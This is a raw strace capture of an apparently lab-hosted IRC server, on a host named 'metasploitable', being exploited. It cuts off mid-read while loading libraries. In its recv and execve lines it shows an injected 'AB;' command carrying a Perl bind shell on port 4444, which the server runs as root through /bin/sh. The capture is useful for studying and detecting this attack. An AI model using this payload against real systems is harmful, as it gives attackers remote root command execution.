4519  20:20:26.370370 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370397 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370410 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370423 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370436 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370449 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370463 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370476 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370490 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370511 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370525 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.370540 time(NULL)        = 1495671626
4519  20:20:26.370585 time(NULL)        = 1495671626
4519  20:20:26.379163 gettimeofday({1495671626, 379163}, NULL) = 0
4519  20:20:26.379163 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:26.379164 clock_gettime(CLOCK_MONOTONIC, {48436, 196172738}) = 0
4519  20:20:26.379164 gettimeofday({1495671626, 379164}, NULL) = 0
4519  20:20:26.379164 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 810000})
4519  20:20:26.568883 clock_gettime(CLOCK_MONOTONIC, {48436, 385916701}) = 0
4519  20:20:26.568918 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  20:20:26.568941 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.568959 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.568973 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.568987 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569000 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569014 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569027 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569041 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569054 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569067 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569081 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569094 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569107 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569121 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569134 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569147 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569160 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569173 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569187 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569200 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569266 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569283 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:26.569317 gettimeofday({1495671626, 569335}, NULL) = 0
4519  20:20:26.569343 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:20:26.569384 clock_gettime(CLOCK_MONOTONIC, {48436, 386396615}) = 0
4519  20:20:26.569395 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:20:26.569423 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:20:26.569438 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:20:26.569450 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:20:26.569466 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 11806
11806 20:20:26.569543 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
11806 20:20:26.569558 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
11806 20:20:26.569575 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:26.569589 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
11806 20:20:26.569697 brk(0)            = 0x80f9000
11806 20:20:26.569771 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.569805 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc9000
11806 20:20:26.569839 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.569871 open("/etc/ld.so.cache", O_RDONLY) = 1
11806 20:20:26.569884 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11806 20:20:26.569902 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc1000
11806 20:20:26.569918 close(1)          = 0
11806 20:20:26.569931 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.569947 open("/lib/libncurses.so.5", O_RDONLY) = 1
11806 20:20:26.569961 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
11806 20:20:26.570055 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
11806 20:20:26.570071 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f91000
11806 20:20:26.570083 mmap2(0xb7fbe000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fbe000
11806 20:20:26.570100 close(1)          = 0
11806 20:20:26.570112 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.570125 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11806 20:20:26.570139 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11806 20:20:26.570313 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11806 20:20:26.570338 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8d000
11806 20:20:26.570350 mmap2(0xb7f8f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f8f000
11806 20:20:26.570380 close(1)          = 0
11806 20:20:26.570392 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.570405 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11806 20:20:26.570419 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11806 20:20:26.570505 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11806 20:20:26.570521 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8c000
11806 20:20:26.570535 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e3d000
11806 20:20:26.570546 mmap2(0xb7f86000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f86000
11806 20:20:26.570561 mmap2(0xb7f89000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f89000
11806 20:20:26.570574 close(1)          = 0
11806 20:20:26.570596 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e3c000
11806 20:20:26.570608 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e3c6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11806 20:20:26.570663 mprotect(0xb7f86000, 4096, PROT_READ) = 0
11806 20:20:26.570700 munmap(0xb7fc1000, 29913) = 0
11806 20:20:26.570797 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.570827 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
11806 20:20:26.570860 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf92d2f0) = -1 ENOTTY (Inappropriate ioctl for device)
11806 20:20:26.570890 brk(0)            = 0x80f9000
11806 20:20:26.570899 brk(0x80fa000)    = 0x80fa000
11806 20:20:26.570911 brk(0x80fb000)    = 0x80fb000
11806 20:20:26.570927 getuid32()        = 0
11806 20:20:26.570937 getgid32()        = 0
11806 20:20:26.570945 geteuid32()       = 0
11806 20:20:26.570954 getegid32()       = 0
11806 20:20:26.570967 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.570981 time(NULL)        = 1495671626
11806 20:20:26.570993 brk(0x80fc000)    = 0x80fc000
11806 20:20:26.571007 brk(0x80fd000)    = 0x80fd000
11806 20:20:26.571026 open("/proc/meminfo", O_RDONLY) = 1
11806 20:20:26.571048 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
11806 20:20:26.571065 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc8000
11806 20:20:26.571076 read(1, "MemTotal:      1035240 kB\nMemFree:        163508 kB\nBuffers:        141456 kB\nCached:         486968 kB\nSwapCached:          0 kB\nActive:         507232 kB\nInactive:       310016 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        163260 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:             452 kB\nWriteback:           0 kB\nAnonPages:      188872 kB\nMapped:          52020 kB\nSlab:            32612 kB\nSReclaimable:    20184 kB\nSUnreclaim:      12428 kB\nPageTables:       2904 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   707968 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
11806 20:20:26.571170 close(1)          = 0
11806 20:20:26.571181 munmap(0xb7fc8000, 4096) = 0
11806 20:20:26.571193 brk(0x80fe000)    = 0x80fe000
11806 20:20:26.571258 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11806 20:20:26.571290 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11806 20:20:26.571316 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11806 20:20:26.571327 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11806 20:20:26.571339 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
11806 20:20:26.571350 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
11806 20:20:26.571363 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.571375 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11806 20:20:26.571387 uname({sys="Linux", node="metasploitable", ...}) = 0
11806 20:20:26.571435 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11806 20:20:26.571453 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11806 20:20:26.571471 brk(0x8100000)    = 0x8100000
11806 20:20:26.571483 getcwd("/etc/unreal", 4096) = 12
11806 20:20:26.571497 getpid()          = 11806
11806 20:20:26.571513 getppid()         = 4519
11806 20:20:26.571529 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11806 20:20:26.571548 stat64("/sbin/sh", 0xbf92d2c8) = -1 ENOENT (No such file or directory)
11806 20:20:26.571561 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11806 20:20:26.571578 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11806 20:20:26.571602 socket(PF_FILE, SOCK_STREAM, 0) = 1
11806 20:20:26.571615 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11806 20:20:26.571627 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11806 20:20:26.571649 close(1)          = 0
11806 20:20:26.571660 socket(PF_FILE, SOCK_STREAM, 0) = 1
11806 20:20:26.571670 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11806 20:20:26.571680 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11806 20:20:26.571698 close(1)          = 0
11806 20:20:26.571784 open("/etc/nsswitch.conf", O_RDONLY) = 1
11806 20:20:26.571814 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11806 20:20:26.571844 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc8000
11806 20:20:26.571856 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11806 20:20:26.571904 read(1, "", 4096) = 0
11806 20:20:26.571914 close(1)          = 0
11806 20:20:26.571923 munmap(0xb7fc8000, 4096) = 0
11806 20:20:26.571939 open("/etc/ld.so.cache", O_RDONLY) = 1
11806 20:20:26.571951 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11806 20:20:26.571967 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc1000
11806 20:20:26.571977 close(1)          = 0
11806 20:20:26.571988 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.572002 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
11806 20:20:26.572020 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
11806 20:20:26.572108 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
11806 20:20:26.572125 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e33000
11806 20:20:26.572137 mmap2(0xb7e3a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e3a000
11806 20:20:26.572154 close(1)          = 0
11806 20:20:26.572165 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.572178 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
11806 20:20:26.572224 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
11806 20:20:26.572344 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
11806 20:20:26.572361 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e1b000
11806 20:20:26.572372 mmap2(0xb7e2f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e2f000
11806 20:20:26.572388 mmap2(0xb7e31000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e31000
11806 20:20:26.572404 close(1)          = 0
11806 20:20:26.572431 munmap(0xb7fc1000, 29913) = 0
11806 20:20:26.572447 open("/etc/ld.so.cache", O_RDONLY) = 1
11806 20:20:26.572459 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11806 20:20:26.572475 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc1000
11806 20:20:26.572485 close(1)          = 0
11806 20:20:26.572495 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.572509 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
11806 20:20:26.572523 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 